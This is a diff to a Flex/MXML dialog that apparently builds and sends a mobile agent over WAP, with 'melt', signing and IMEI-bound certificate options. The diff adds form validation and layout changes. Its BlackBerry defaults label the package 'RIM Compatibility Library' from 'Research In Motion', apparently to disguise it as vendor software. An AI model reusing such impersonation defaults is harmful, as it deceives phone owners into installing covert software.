@@ -15,6 +15,7 @@
       
       import mx.collections.ListCollectionView;
       import mx.core.UIComponent;
+      import mx.events.ValidationResultEvent;
       import mx.managers.PopUpManager;
       import mx.rpc.events.FaultEvent;
       import mx.rpc.events.ResultEvent;
@@ -97,15 +98,33 @@
       
       private function collName(o:Object):String
       {
-        // TODO: instead of this check, filter only valid collectors
-        if (o != null && o['address'] != '')
+        if (o == null)
+          return 'invalid address';
+        
+        if (o.hasOwnProperty('address') && o['address'] != '')
           return "http://" + o['address']  + '/';
         
-        return 'invalid address';
+        return o.toString();
       }
       
       protected function send():void
       {        
+
+        if (number.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_NUMBER'), R.get('ERROR'));
+          return;
+        }
+
+        if (url.textInput.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_URL'), R.get('ERROR'));
+          return;
+        }
+
+        if (appname.text.length == 0) {
+          AlertPopUp.show(R.get('MISSING_APPLICATION'), R.get('ERROR'));
+          return;
+        }
+
         params = {platform: 'wap', deliver: {}, generate: {platforms: platforms, binary: {demo: createBtn.demo.selected}, melt: { appname: appname.text }, sign: {} } };
         
         if (currentState == 'blackberry') {
@@ -154,7 +173,7 @@
   <fx:Declarations>
     <s:RadioButtonGroup id="Service"/>
   </fx:Declarations>
-  
+    
   <s:states>
     <s:State name='all'/>
     <s:State name='multiplatform'/>
@@ -180,16 +199,16 @@
       </s:HGroup>
     </s:FormItem>
     <s:FormItem label="Text" enabled="{!servloading.selected}">    
-      <s:TextInput id="text" text=""/>
+      <s:TextInput id="text" text="" width="180"/>
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="blackberry" left="10" top="165">
+  <s:Form includeIn="blackberry" left="10" top="180">
     <s:FormItem label="Name">    
       <s:TextInput id="nameForm" text="RIM Compatibility Library" width="150"/>
     </s:FormItem>
     <s:FormItem label="Description">        
-      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="200"/>
+      <s:TextInput id="descForm" text="RIM Compatibility Library used by applications in the App World" width="210"/>
     </s:FormItem>
     <s:FormItem label="Vendor">       
       <s:TextInput id="vendorForm" text="Research In Motion" width="150"/>
@@ -199,7 +218,7 @@
     </s:FormItem>
   </s:Form>
   
-  <s:Form includeIn="symbian" left="10" top="165">
+  <s:Form includeIn="symbian" left="10" top="180">
     <s:FormItem label="Certificate bound to phone IMEI">    
       <s:Button width="80" label="{R.get('BROWSE')}..." click="browse()"/>
     </s:FormItem>
